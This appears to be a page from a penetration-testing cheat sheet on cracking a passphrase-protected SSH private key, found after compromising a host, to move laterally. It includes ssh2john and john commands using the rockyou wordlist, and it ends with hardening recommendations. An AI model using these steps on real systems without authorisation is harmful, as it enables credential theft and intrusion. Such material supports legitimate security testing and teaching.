---
layout: default
title: SSH Private Key
parent: Cracking
nav_order: 2
permalink: /cracking/ssh/
---

# SSH Private Key
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Vulnerability

If you gain access to a computer, you should look for SSH keys that would allow you to lateralize on the network. Nevertheless, SSH private keys are sometimes protected with a passphrase. You can try to crack this passphrase to use the key, and even reuse the passphrase somewhere else.

## Prerequisites

* Access to SSH private key protected with a passphrase.

## Exploit

```bash
# First, connect on the target using the private key to check it prompts password.
# If the key is not protected with a passphrase, you can use it as-is.
ssh -i id_rsa -p $port $username@$target

# Convert the private key into a crackable format.
ssh2john id_rsa > ssh.hash

# To add rules to john, first put [List.Rules:<RULE_NAME>] at the beggining of the rule.
sudo sh -c 'cat file.rule >> /etc/john/john.conf'

# Crack it with hashcat or john.
john --wordlist=/usr/share/wordlists/rockyou.txt [--rules=<RULE_NAME>] ssh.hash
```

## Recommendations

- [ ] Always enforce strong and complex passphrase on your SSH private keys.
- [ ] Set strict filesystem permissions on your SSH private keys: `chmod 700 ~/.ssh && chmod 600 ~/.ssh/id_rsa` on Linux. 